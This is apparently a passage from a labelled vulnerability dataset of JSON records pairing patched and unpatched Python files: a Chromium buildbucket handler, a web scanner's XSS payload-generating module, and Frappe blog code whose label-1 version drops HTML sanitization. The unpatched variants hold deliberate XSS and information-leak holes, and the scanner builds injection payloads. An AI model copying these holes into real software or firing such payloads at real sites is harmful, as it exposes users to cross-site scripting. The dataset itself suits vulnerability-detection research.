explorer to see the build.\"\"\"\n\n  def get(self, build_id):\n    api_path = '/_ah/api/buildbucket/v1/builds/%s' % build_id\n    return self.redirect(api_path)\n\n\nclass ViewBuildHandler(auth.AuthenticatingHandler):  # pragma: no cover\n  \"\"\"Redirects to API explorer to see the build.\"\"\"\n\n  @auth.public\n  def get(self, build_id):\n    try:\n      build_id = int(build_id)\n    except ValueError:\n      self.response.write('invalid build id')\n      self.abort(400)\n\n    build = model.Build.get_by_id(build_id)\n    can_view = build and user.can_view_build_async(build).get_result()\n\n    if not can_view:\n      if auth.get_current_identity().is_anonymous:\n        return self.redirect(self.create_login_url(self.request.url))\n      self.response.write('build %d not found' % build_id)\n      self.abort(404)\n\n    return self.redirect(str(build.url))\n\n\nclass TaskCancelSwarmingTask(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Cancels a swarming task.\"\"\"\n\n  @decorators.require_taskqueue('backend-default')\n  def post(self, host, task_id):\n    swarming.cancel_task(host, task_id)\n\n\nclass UnregisterBuilders(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Unregisters builders that didn't have builds for a long time.\"\"\"\n\n  @decorators.require_cronjob\n  def get(self):\n    service.unregister_builders()\n\n\ndef get_frontend_routes():  # pragma: no cover\n  endpoints_services = [\n      legacy_api.BuildBucketApi,\n      config_api.ConfigApi,\n      swarmbucket_api.SwarmbucketApi,\n  ]\n  routes = [\n      webapp2.Route(r'/', MainHandler),\n      webapp2.Route(r'/b/<build_id:\\d+>', BuildRPCHandler),\n      webapp2.Route(r'/build/<build_id:\\d+>', ViewBuildHandler),\n  ]\n  routes.extend(endpoints_webapp2.api_routes(endpoints_services))\n  # /api routes should be removed once clients are hitting /_ah/api.\n  routes.extend(\n      endpoints_webapp2.api_routes(endpoints_services, base_path='/api')\n  )\n\n  prpc_server = prpc.Server()\n  prpc_server.add_interceptor(auth.prpc_interceptor)\n  prpc_server.add_service(access.AccessServicer())\n  prpc_server.add_service(api.BuildsApi())\n  routes += prpc_server.get_routes()\n\n  return routes\n\n\ndef get_backend_routes():  # pragma: no cover\n  prpc_server = prpc.Server()\n  prpc_server.add_interceptor(auth.prpc_interceptor)\n  prpc_server.add_service(api.BuildsApi())\n\n  return [  # pragma: no branch\n      webapp2.Route(r'/internal/cron/buildbucket/expire_build_leases',\n                    expiration.CronExpireBuildLeases),\n      webapp2.Route(r'/internal/cron/buildbucket/expire_builds',\n                    expiration.CronExpireBuilds),\n      webapp2.Route(r'/internal/cron/buildbucket/delete_builds',\n                    expiration.CronDeleteBuilds),\n      webapp2.Route(r'/internal/cron/buildbucket/update_buckets',\n                    CronUpdateBuckets),\n      webapp2.Route(r'/internal/cron/buildbucket/bq-export-prod',\n                    bq.CronExportBuildsProd),\n      webapp2.Route(r'/internal/cron/buildbucket/bq-export-experimental',\n                    bq.CronExportBuildsExperimental),\n      webapp2.Route(r'/internal/cron/buildbucket/unregister-builders',\n                    UnregisterBuilders),\n      webapp2.Route(r'/internal/task/buildbucket/notify/<build_id:\\d+>',\n                    notifications.TaskPublishNotification),\n      webapp2.Route(\n          r'/internal/task/buildbucket/cancel_swarming_task/<host>/<task_id>',\n          TaskCancelSwarmingTask),\n  ] + bulkproc.get_routes() + prpc_server.get_routes()\n/n/n/n", "label": 0}, {"id": "2f39f3df54fb79b56744f00bcf97583b3807851f", "code": "/appengine/cr-buildbucket/handlers.py/n/n# Copyright 2017 The Chromium Authors. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\nfrom google.appengine.api import users as gae_users\n\nfrom components import auth\nfrom components import config as config_api\nfrom components import decorators\nfrom components import endpoints_webapp2\nfrom components import prpc\n\nimport webapp2\n\nfrom legacy import api as legacy_api\nfrom legacy import swarmbucket_api\nimport access\nimport api\nimport bq\nimport bulkproc\nimport config\nimport expiration\nimport model\nimport notifications\nimport service\nimport swarming\nimport user\n\nREADME_MD = (\n    'https://chromium.googlesource.com/infra/infra/+/master/'\n    'appengine/cr-buildbucket/README.md'\n)\n\n\nclass MainHandler(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Redirects to README.md.\"\"\"\n\n  def get(self):\n    return self.redirect(README_MD)\n\n\nclass CronUpdateBuckets(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Updates buckets from configs.\"\"\"\n\n  @decorators.require_cronjob\n  def get(self):\n    config.cron_update_buckets()\n\n\nclass BuildRPCHandler(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Redirects to API explorer to see the build.\"\"\"\n\n  def get(self, build_id):\n    api_path = '/_ah/api/buildbucket/v1/builds/%s' % build_id\n    return self.redirect(api_path)\n\n\nclass ViewBuildHandler(auth.AuthenticatingHandler):  # pragma: no cover\n  \"\"\"Redirects to API explorer to see the build.\"\"\"\n\n  @auth.public\n  def get(self, build_id):\n    try:\n      build_id = int(build_id)\n    except ValueError as ex:\n      self.response.write(ex.message)\n      self.abort(400)\n\n    build = model.Build.get_by_id(build_id)\n    can_view = build and user.can_view_build_async(build).get_result()\n\n    if not can_view:\n      if auth.get_current_identity().is_anonymous:\n        return self.redirect(gae_users.create_login_url(self.request.url))\n      self.response.write('build %d not found' % build_id)\n      self.abort(404)\n\n    return self.redirect(str(build.url))\n\n\nclass TaskCancelSwarmingTask(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Cancels a swarming task.\"\"\"\n\n  @decorators.require_taskqueue('backend-default')\n  def post(self, host, task_id):\n    swarming.cancel_task(host, task_id)\n\n\nclass UnregisterBuilders(webapp2.RequestHandler):  # pragma: no cover\n  \"\"\"Unregisters builders that didn't have builds for a long time.\"\"\"\n\n  @decorators.require_cronjob\n  def get(self):\n    service.unregister_builders()\n\n\ndef get_frontend_routes():  # pragma: no cover\n  endpoints_services = [\n      legacy_api.BuildBucketApi,\n      config_api.ConfigApi,\n      swarmbucket_api.SwarmbucketApi,\n  ]\n  routes = [\n      webapp2.Route(r'/', MainHandler),\n      webapp2.Route(r'/b/<build_id:\\d+>', BuildRPCHandler),\n      webapp2.Route(r'/build/<build_id:\\d+>', ViewBuildHandler),\n  ]\n  routes.extend(endpoints_webapp2.api_routes(endpoints_services))\n  # /api routes should be removed once clients are hitting /_ah/api.\n  routes.extend(\n      endpoints_webapp2.api_routes(endpoints_services, base_path='/api')\n  )\n\n  prpc_server = prpc.Server()\n  prpc_server.add_interceptor(auth.prpc_interceptor)\n  prpc_server.add_service(access.AccessServicer())\n  prpc_server.add_service(api.BuildsApi())\n  routes += prpc_server.get_routes()\n\n  return routes\n\n\ndef get_backend_routes():  # pragma: no cover\n  prpc_server = prpc.Server()\n  prpc_server.add_interceptor(auth.prpc_interceptor)\n  prpc_server.add_service(api.BuildsApi())\n\n  return [  # pragma: no branch\n      webapp2.Route(r'/internal/cron/buildbucket/expire_build_leases',\n                    expiration.CronExpireBuildLeases),\n      webapp2.Route(r'/internal/cron/buildbucket/expire_builds',\n                    expiration.CronExpireBuilds),\n      webapp2.Route(r'/internal/cron/buildbucket/delete_builds',\n                    expiration.CronDeleteBuilds),\n      webapp2.Route(r'/internal/cron/buildbucket/update_buckets',\n                    CronUpdateBuckets),\n      webapp2.Route(r'/internal/cron/buildbucket/bq-export-prod',\n                    bq.CronExportBuildsProd),\n      webapp2.Route(r'/internal/cron/buildbucket/bq-export-experimental',\n                    bq.CronExportBuildsExperimental),\n      webapp2.Route(r'/internal/cron/buildbucket/unregister-builders',\n                    UnregisterBuilders),\n      webapp2.Route(r'/internal/task/buildbucket/notify/<build_id:\\d+>',\n                    notifications.TaskPublishNotification),\n      webapp2.Route(\n          r'/internal/task/buildbucket/cancel_swarming_task/<host>/<task_id>',\n          TaskCancelSwarmingTask),\n  ] + bulkproc.get_routes() + prpc_server.get_routes()\n/n/n/n", "label": 1}, {"id": "38c184f73918a249f6bc4e395ca2e5385e1ef220", "code": "modules/ActiveScan/xss.py/n/nfrom cores.base_plugins import Scanner\nimport re\n\nclass Check(Scanner):\n\tdef gen_payload(self):\n\t\tfrom cores.xeger import Xeger\n\t\tgenerate = Xeger()\n\t\twhile True:\n\t\t\t_payload = generate.xeger(\"((\\%3C)|<)((\\%69)|i|(\\%49))((\\%6D)|m|(\\%4D))((\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\")\n\t\t\tif any(x in _payload for x in \"\\\"'><;/\"):\n\t\t\t\treturn _payload\n\t\n\tdef fuzz(self, url, payload, response, parameter):\n\t\tfor injection_types in self.signatures.keys():\n\t\t\tfor sig in self.signatures[injection_types]:\n\t\t\t\tmatch = re.findall(re.escape(sig), response)\n\t\t\t\tif match and any(x in payload for x in \"><\"):\n\t\t\t\t\treturn self.signatures.keys()[0]\n\t\treturn False\n\t\n\tdef signature(self):\n\t\treturn {\"XSS\" : self.payload}\n/n/n/n", "label": 0}, {"id": "38c184f73918a249f6bc4e395ca2e5385e1ef220", "code": "/modules/ActiveScan/xss.py/n/nfrom cores.base_plugins import Scanner\nimport re\n\nclass Check(Scanner):\n\tdef gen_payload(self):\n\t\tfrom cores.xeger import Xeger\n\t\tgenerate = Xeger()\n\t\twhile True:\n\t\t\t_payload = generate.xeger(\"((\\%3C)|<)((\\%69)|i|(\\%49))((\\%6D)|m|(\\%4D))((\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\")\n\t\t\tif any(x in _payload for x in \"\\\"'><;/\"):\n\t\t\t\treturn _payload\n\n\tdef check(self, url, payload, response, parameter):\n\t\tfor injection_types in self.signatures.keys():\n\t\t\tfor sig in self.signatures[injection_types]:\n\t\t\t\tmatch = re.findall(re.escape(sig), response)\n\t\t\t\tif match and any(x in payload for x in \"><\"):\n\t\t\t\t\tself.found(injection_types, url, parameter, payload)\n\t\t\t\t\treturn True\n\t\treturn False\n\t\n\tdef signature(self):\n\t\treturn {\"XSS\" : self.payload}\n/n/n/n", "label": 1}, {"id": "2fa19c25066ed17478d683666895e3266936aee6", "code": "frappe/website/doctype/blog_post/blog_post.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe\nfrom frappe import _\nfrom frappe.website.website_generator import WebsiteGenerator\nfrom frappe.website.render import clear_cache\nfrom frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown, sanitize_html\nfrom frappe.website.utils import find_first_image, get_comment_list\n\nclass BlogPost(WebsiteGenerator):\n\twebsite = frappe._dict(\n\t\torder_by = \"published_on desc\"\n\t)\n\n\tdef make_route(self):\n\t\tif not self.route:\n\t\t\treturn frappe.db.get_value('Blog Category', self.blog_category,\n\t\t\t\t'route') + '/' + self.scrub(self.title)\n\n\tdef get_feed(self):\n\t\treturn self.title\n\n\tdef validate(self):\n\t\tsuper(BlogPost, self).validate()\n\n\t\tif not self.blog_intro:\n\t\t\tself.blog_intro = self.content[:140]\n\t\t\tself.blog_intro = strip_html_tags(self.blog_intro)\n\n\t\tif self.blog_intro:\n\t\t\tself.blog_intro = self.blog_intro[:140]\n\n\t\tif self.published and not self.published_on:\n\t\t\tself.published_on = today()\n\n\t\t# update posts\n\t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post`\n\t\t\twhere ifnull(blogger,'')=tabBlogger.name)\n\t\t\twhere name=%s\"\"\", (self.blogger,))\n\n\tdef on_update(self):\n\t\tclear_cache(\"writers\")\n\n\tdef get_context(self, context):\n\t\t# this is for double precaution. usually it wont reach this code if not published\n\t\tif not cint(self.published):\n\t\t\traise Exception(\"This blog has not been published yet!\")\n\n\t\t# temp fields\n\t\tcontext.full_name = get_fullname(self.owner)\n\t\tcontext.updated = global_date_format(self.published_on)\n\n\t\tif self.blogger:\n\t\t\tcontext.blogger_info = frappe.get_doc(\"Blogger\", self.blogger).as_dict()\n\n\t\tcontext.description = self.blog_intro or self.content[:140]\n\n\t\tcontext.metatags = {\n\t\t\t\"name\": self.title,\n\t\t\t\"description\": context.description,\n\t\t}\n\n\t\tif \"<!-- markdown -->\" in context.content:\n\t\t\tcontext.content = markdown(context.content)\n\n\t\timage = find_first_image(self.content)\n\t\tif image:\n\t\t\tcontext.metatags[\"image\"] = image\n\n\t\tcontext.comment_list = get_comment_list(self.doctype, self.name)\n\t\tif not context.comment_list:\n\t\t\tcontext.comment_text = _('No comments yet')\n\t\telse:\n\t\t\tif(len(context.comment_list)) == 1:\n\t\t\t\tcontext.comment_text = _('1 comment')\n\t\t\telse:\n\t\t\t\tcontext.comment_text = _('{0} comments').format(len(context.comment_list))\n\n\t\tcontext.category = frappe.db.get_value(\"Blog Category\",\n\t\t\tcontext.doc.blog_category, [\"title\", \"route\"], as_dict=1)\n\t\tcontext.parents = [{\"name\": _(\"Home\"), \"route\":\"/\"},\n\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"},\n\t\t\t{\"label\": context.category.title, \"route\":context.category.route}]\n\ndef get_list_context(context=None):\n\tlist_context = frappe._dict(\n\t\ttemplate = \"templates/includes/blog/blog.html\",\n\t\tget_list = get_blog_list,\n\t\thide_filters = True,\n\t\tchildren = get_children(),\n\t\t# show_search = True,\n\t\ttitle = _('Blog')\n\t)\n\n\tcategory = sanitize_html(frappe.local.form_dict.blog_category or frappe.local.form_dict.category)\n\tif category:\n\t\tcategory_title = get_blog_category(category)\n\t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n\t\tlist_context.title = category_title\n\n\telif frappe.local.form_dict.blogger:\n\t\tblogger = frappe.db.get_value(\"Blogger\", {\"name\": frappe.local.form_dict.blogger}, \"full_name\")\n\t\tlist_context.sub_title = _(\"Posts by {0}\").format(blogger)\n\t\tlist_context.title = blogger\n\n\telif frappe.local.form_dict.txt:\n\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(sanitize_html(frappe.local.form_dict.txt))\n\n\tif list_context.sub_title:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n\t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}]\n\telse:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"}]\n\n\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True))\n\treturn list_context\n\ndef get_children():\n\treturn frappe.db.sql(\"\"\"select route as name,\n\t\ttitle from `tabBlog Category`\n\t\twhere published = 1\n\t\tand exists (select name from `tabBlog Post`\n\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)\n\t\torder by title asc\"\"\", as_dict=1)\n\ndef clear_blog_cache():\n\tfor blog in frappe.db.sql_list(\"\"\"select route from\n\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"):\n\t\tclear_cache(blog)\n\n\tclear_cache(\"writers\")\n\ndef get_blog_category(route):\n\treturn frappe.db.get_value(\"Blog Category\", {\"name\": route}, \"title\") or route\n\ndef get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):\n\tconditions = []\n\tif filters:\n\t\tif filters.blogger:\n\t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))\n\t\tif filters.blog_category:\n\t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category))\n\n\tif txt:\n\t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt)))\n\n\tif conditions:\n\t\tfrappe.local.no_cache = 1\n\n\tquery = \"\"\"\\\n\t\tselect\n\t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on,\n\t\t\t\tt1.published_on as creation,\n\t\t\t\tt1.content as content,\n\t\t\t\tifnull(t1.blog_intro, t1.content) as intro,\n\t\t\t\tt2.full_name, t2.avatar, t1.blogger,\n\t\t\t\t(select count(name) from `tabCommunication`\n\t\t\t\t\twhere\n\t\t\t\t\t\tcommunication_type='Comment'\n\t\t\t\t\t\tand comment_type='Comment'\n\t\t\t\t\t\tand reference_doctype='Blog Post'\n\t\t\t\t\t\tand reference_name=t1.name) as comments\n\t\tfrom `tabBlog Post` t1, `tabBlogger` t2\n\t\twhere ifnull(t1.published,0)=1\n\t\tand t1.blogger = t2.name\n\t\t%(condition)s\n\t\torder by published_on desc, name asc\n\t\tlimit %(start)s, %(page_len)s\"\"\" % {\n\t\t\t\"start\": limit_start, \"page_len\": limit_page_length,\n\t\t\t\t\"condition\": (\" and \" + \" and \".join(conditions)) if conditions else \"\"\n\t\t}\n\n\tposts = frappe.db.sql(query, as_dict=1)\n\n\tfor post in posts:\n\t\tpost.cover_image = find_first_image(post.content)\n\t\tpost.published = global_date_format(post.creation)\n\t\tpost.content = strip_html_tags(post.content[:340])\n\t\tif not post.comments:\n\t\t\tpost.comment_text = _('No comments yet')\n\t\telif post.comments==1:\n\t\t\tpost.comment_text = _('1 comment')\n\t\telse:\n\t\t\tpost.comment_text = _('{0} comments').format(str(post.comments))\n\n\t\tpost.avatar = post.avatar or \"\"\n\t\tpost.category = frappe.db.get_value('Blog Category', post.blog_category,\n\t\t\t['route', 'title'], as_dict=True)\n\n\t\tif post.avatar and (not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"):\n\t\t\tpost.avatar = \"/\" + post.avatar\n\n\treturn posts\n/n/n/n", "label": 0}, {"id": "2fa19c25066ed17478d683666895e3266936aee6", "code": "/frappe/website/doctype/blog_post/blog_post.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport frappe\nfrom frappe import _\nfrom frappe.website.website_generator import WebsiteGenerator\nfrom frappe.website.render import clear_cache\nfrom frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown\nfrom frappe.website.utils import find_first_image, get_comment_list\n\nclass BlogPost(WebsiteGenerator):\n\twebsite = frappe._dict(\n\t\torder_by = \"published_on desc\"\n\t)\n\n\tdef make_route(self):\n\t\tif not self.route:\n\t\t\treturn frappe.db.get_value('Blog Category', self.blog_category,\n\t\t\t\t'route') + '/' + self.scrub(self.title)\n\n\tdef get_feed(self):\n\t\treturn self.title\n\n\tdef validate(self):\n\t\tsuper(BlogPost, self).validate()\n\n\t\tif not self.blog_intro:\n\t\t\tself.blog_intro = self.content[:140]\n\t\t\tself.blog_intro = strip_html_tags(self.blog_intro)\n\n\t\tif self.blog_intro:\n\t\t\tself.blog_intro = self.blog_intro[:140]\n\n\t\tif self.published and not self.published_on:\n\t\t\tself.published_on = today()\n\n\t\t# update posts\n\t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post`\n\t\t\twhere ifnull(blogger,'')=tabBlogger.name)\n\t\t\twhere name=%s\"\"\", (self.blogger,))\n\n\tdef on_update(self):\n\t\tclear_cache(\"writers\")\n\n\tdef get_context(self, context):\n\t\t# this is for double precaution. usually it wont reach this code if not published\n\t\tif not cint(self.published):\n\t\t\traise Exception(\"This blog has not been published yet!\")\n\n\t\t# temp fields\n\t\tcontext.full_name = get_fullname(self.owner)\n\t\tcontext.updated = global_date_format(self.published_on)\n\n\t\tif self.blogger:\n\t\t\tcontext.blogger_info = frappe.get_doc(\"Blogger\", self.blogger).as_dict()\n\n\t\tcontext.description = self.blog_intro or self.content[:140]\n\n\t\tcontext.metatags = {\n\t\t\t\"name\": self.title,\n\t\t\t\"description\": context.description,\n\t\t}\n\n\t\tif \"<!-- markdown -->\" in context.content:\n\t\t\tcontext.content = markdown(context.content)\n\n\t\timage = find_first_image(self.content)\n\t\tif image:\n\t\t\tcontext.metatags[\"image\"] = image\n\n\t\tcontext.comment_list = get_comment_list(self.doctype, self.name)\n\t\tif not context.comment_list:\n\t\t\tcontext.comment_text = _('No comments yet')\n\t\telse:\n\t\t\tif(len(context.comment_list)) == 1:\n\t\t\t\tcontext.comment_text = _('1 comment')\n\t\t\telse:\n\t\t\t\tcontext.comment_text = _('{0} comments').format(len(context.comment_list))\n\n\t\tcontext.category = frappe.db.get_value(\"Blog Category\",\n\t\t\tcontext.doc.blog_category, [\"title\", \"route\"], as_dict=1)\n\t\tcontext.parents = [{\"name\": _(\"Home\"), \"route\":\"/\"},\n\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"},\n\t\t\t{\"label\": context.category.title, \"route\":context.category.route}]\n\ndef get_list_context(context=None):\n\tlist_context = frappe._dict(\n\t\ttemplate = \"templates/includes/blog/blog.html\",\n\t\tget_list = get_blog_list,\n\t\thide_filters = True,\n\t\tchildren = get_children(),\n\t\t# show_search = True,\n\t\ttitle = _('Blog')\n\t)\n\n\tcategory = frappe.local.form_dict.blog_category or frappe.local.form_dict.category\n\tif category:\n\t\tcategory_title = get_blog_category(category)\n\t\tlist_context.sub_title = _(\"Posts filed under {0}\").format(category_title)\n\t\tlist_context.title = category_title\n\n\telif frappe.local.form_dict.blogger:\n\t\tblogger = frappe.db.get_value(\"Blogger\", {\"name\": frappe.local.form_dict.blogger}, \"full_name\")\n\t\tlist_context.sub_title = _(\"Posts by {0}\").format(blogger)\n\t\tlist_context.title = blogger\n\n\telif frappe.local.form_dict.txt:\n\t\tlist_context.sub_title = _('Filtered by \"{0}\"').format(frappe.local.form_dict.txt)\n\n\tif list_context.sub_title:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"},\n\t\t\t\t\t\t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}]\n\telse:\n\t\tlist_context.parents = [{\"name\": _(\"Home\"), \"route\": \"/\"}]\n\n\tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True))\n\treturn list_context\n\ndef get_children():\n\treturn frappe.db.sql(\"\"\"select route as name,\n\t\ttitle from `tabBlog Category`\n\t\twhere published = 1\n\t\tand exists (select name from `tabBlog Post`\n\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)\n\t\torder by title asc\"\"\", as_dict=1)\n\ndef clear_blog_cache():\n\tfor blog in frappe.db.sql_list(\"\"\"select route from\n\t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"):\n\t\tclear_cache(blog)\n\n\tclear_cache(\"writers\")\n\ndef get_blog_category(route):\n\treturn frappe.db.get_value(\"Blog Category\", {\"name\": route}, \"title\") or route\n\ndef get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):\n\tconditions = []\n\tif filters:\n\t\tif filters.blogger:\n\t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger))\n\t\tif filters.blog_category:\n\t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category))\n\n\tif txt:\n\t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like \"%{0}%\")'.format(frappe.db.escape(txt)))\n\n\tif conditions:\n\t\tfrappe.local.no_cache = 1\n\n\tquery = \"\"\"\\\n\t\tselect\n\t\t\tt1.title, t1.name, t1.blog_category, t1.route, t1.published_on,\n\t\t\t\tt1.published_on as creation,\n\t\t\t\tt1.content as content,\n\t\t\t\tifnull(t1.blog_intro, t1.content) as intro,\n\t\t\t\tt2.full_name, t2.avatar, t1.blogger,\n\t\t\t\t(select count(name) from `tabCommunication`\n\t\t\t\t\twhere\n\t\t\t\t\t\tcommunication_type='Comment'\n\t\t\t\t\t\tand comment_type='Comment'\n\t\t\t\t\t\tand reference_doctype='Blog Post'\n\t\t\t\t\t\tand reference_name=t1.name) as comments\n\t\tfrom `tabBlog Post` t1, `tabBlogger` t2\n\t\twhere ifnull(t1.published,0)=1\n\t\tand t1.blogger = t2.name\n\t\t%(condition)s\n\t\torder by published_on desc, name asc\n\t\tlimit %(start)s, %(page_len)s\"\"\" % {\n\t\t\t\"start\": limit_start, \"page_len\": limit_page_length,\n\t\t\t\t\"condition\": (\" and \" + \" and \".join(conditions)) if conditions else \"\"\n\t\t}\n\n\tposts = frappe.db.sql(query, as_dict=1)\n\n\tfor post in posts:\n\t\tpost.cover_image = find_first_image(post.content)\n\t\tpost.published = global_date_format(post.creation)\n\t\tpost.content = strip_html_tags(post.content[:340])\n\t\tif not post.comments:\n\t\t\tpost.comment_text = _('No comments yet')\n\t\telif post.comments==1:\n\t\t\tpost.comment_text = _('1 comment')\n\t\telse:\n\t\t\tpost.comment_text = _('{0} comments').format(str(post.comments))\n\n\t\tpost.avatar = post.avatar or \"\"\n\t\tpost.category = frappe.db.get_value('Blog Category', post.blog_category,\n\t\t\t['route', 'title'], as_dict=True)\n\n\t\tif post.avatar and (not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"):\n\t\t\tpost.avatar = \"/\" + post.avatar\n\n\treturn posts\n/n/n/n", "label": 1}, {"id": "acd2f589b6cd2d1011be4a4e4965a1b3ed489c37", "code": "frappe/core/doctype/doctype/doctype.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors\n# MIT License. See license.txt\n\nfrom __future__ import unicode_literals\n\nimport six\n\nimport re, copy, os, subprocess\nimport frappe\nfrom frappe import _\n\nfrom frappe.utils import now, cint\nfrom frappe.model import no_value_fields, default_fields\nfrom frappe.model.document import Document\nfrom frappe.custom.doctype.property_setter.property_setter import make_property_setter\nfrom frappe.desk.notifications import delete_notification_count_for\nfrom frappe.modules import make_boilerplate, get_doc_path\nfrom frappe.model.db_schema import validate_column_name, validate_column_length, type_map\nfrom frappe.model.docfield import supports_translation\nimport frappe.website.render\n\n# imports - third-party imports\nimport pymysql\nfrom pymysql.constants import ER\n\nclass InvalidFieldNameError(frappe.ValidationError): pass\nclass UniqueFieldnameError(frappe.ValidationError): pass\nclass IllegalMandatoryError(frappe.ValidationError): pass\nclass DoctypeLinkError(frappe.ValidationError): pass\nclass WrongOptionsDoctypeLinkError(frappe.ValidationError): pass\nclass HiddenAndMandatoryWithoutDefaultError(frappe.ValidationError): pass\nclass NonUniqueError(frappe.ValidationError): pass\nclass CannotIndexedError(frappe.ValidationError): pass\nclass CannotCreateStandardDoctypeError(frappe.ValidationError): pass\n\nform_grid_templates = {\n\t\"fields\": \"templates/form_grid/fields.html\"\n}\n\nclass DocType(Document):\n\tdef get_feed(self):\n\t\treturn self.name\n\n\tdef validate(self):\n\t\t\"\"\"Validate DocType before saving.\n\n\t\t- Check if developer mode is set.\n\t\t- Validate series\n\t\t- Check fieldnames (duplication etc)\n\t\t- Clear permission table for child tables\n\t\t- Add `amended_from` and `amended_by` if Amendable\"\"\"\n\n\t\tself.check_developer_mode()\n\n\t\tself.validate_name()\n\n\t\tif self.issingle:\n\t\t\tself.allow_import = 0\n\t\t\tself.is_submittable = 0\n\t\t\tself.istable = 0\n\n\t\telif self.istable:\n\t\t\tself.allow_import = 0\n\t\t\tself.permissions = []\n\n\t\tself.scrub_field_names()\n\t\tself.set_default_in_list_view()\n\t\tself.set_default_translatable()\n\t\tself.validate_series()\n\t\tself.validate_document_type()\n\t\tvalidate_fields(self)\n\n\t\tif self.istable:\n\t\t\t# no permission records for child table\n\t\t\tself.permissions = []\n\t\telse:\n\t\t\tvalidate_permissions(self)\n\n\t\tself.make_amendable()\n\t\tself.validate_website()\n\n\t\tif not self.is_new():\n\t\t\tself.before_update = frappe.get_doc('DocType', self.name)\n\n\t\tif not self.is_new():\n\t\t\tself.setup_fields_to_fetch()\n\n\t\tif self.default_print_format and not self.custom:\n\t\t\tfrappe.throw(_('Standard DocType cannot have default print format, use Customize Form'))\n\n\tdef set_default_in_list_view(self):\n\t\t'''Set default in-list-view for first 4 mandatory fields'''\n\t\tif not [d.fieldname for d in self.fields if d.in_list_view]:\n\t\t\tcnt = 0\n\t\t\tfor d in self.fields:\n\t\t\t\tif d.reqd and not d.hidden and not d.fieldtype == \"Table\":\n\t\t\t\t\td.in_list_view = 1\n\t\t\t\t\tcnt += 1\n\t\t\t\t\tif cnt == 4: break\n\n\tdef set_default_translatable(self):\n\t\t'''Ensure that non-translatable never will be translatable'''\n\t\tfor d in self.fields:\n\t\t\tif d.translatable and not supports_translation(d.fieldtype):\n\t\t\t\td.translatable = 0\n\n\tdef check_developer_mode(self):\n\t\t\"\"\"Throw exception if not developer mode or via patch\"\"\"\n\t\tif frappe.flags.in_patch or frappe.flags.in_test:\n\t\t\treturn\n\n\t\tif not frappe.conf.get(\"developer_mode\") and not self.custom:\n\t\t\tfrappe.throw(_(\"Not in Developer Mode! Set in site_config.json or make 'Custom' DocType.\"), CannotCreateStandardDoctypeError)\n\n\tdef setup_fields_to_fetch(self):\n\t\t'''Setup query to update values for newly set fetch values'''\n\t\ttry:\n\t\t\told_meta = frappe.get_meta(frappe.get_doc('DocType', self.name), cached=False)\n\t\t\told_fields_to_fetch = [df.fieldname for df in old_meta.get_fields_to_fetch()]\n\t\texcept frappe.DoesNotExistError:\n\t\t\told_fields_to_fetch = []\n\n\t\tnew_meta = frappe.get_meta(self, cached=False)\n\n\t\tself.flags.update_fields_to_fetch_queries = []\n\n\t\tif set(old_fields_to_fetch) != set([df.fieldname for df in new_meta.get_fields_to_fetch()]):\n\t\t\tfor df in new_meta.get_fields_to_fetch():\n\t\t\t\tif df.fieldname not in old_fields_to_fetch:\n\t\t\t\t\tlink_fieldname, source_fieldname = df.fetch_from.split('.', 1)\n\t\t\t\t\tlink_df = new_meta.get_field(link_fieldname)\n\n\t\t\t\t\tself.flags.update_fields_to_fetch_queries.append('''update\n\t\t\t\t\t\t\t`tab{link_doctype}` source,\n\t\t\t\t\t\t\t`tab{doctype}` target\n\t\t\t\t\t\tset\n\t\t\t\t\t\t\ttarget.`{fieldname}` = source.`{source_fieldname}`\n\t\t\t\t\t\twhere\n\t\t\t\t\t\t\ttarget.`{link_fieldname}` = 